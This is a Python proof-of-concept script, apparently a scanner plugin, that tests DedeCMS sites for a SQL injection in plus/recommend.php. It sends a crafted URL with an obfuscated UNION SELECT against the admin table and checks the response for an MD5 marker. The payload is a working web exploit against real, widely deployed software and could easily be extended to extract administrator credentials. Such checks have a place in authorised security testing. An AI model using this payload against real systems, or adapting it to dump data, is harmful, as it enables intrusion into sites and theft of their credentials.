# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class dedecms_recommend_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'dedecms',
            'vuln_title':'dedecms_recommend_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'dedecms recommend.php SQL注入',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            #判断headers的Content-Type是否为application/xml
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = dedecms_recommend_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)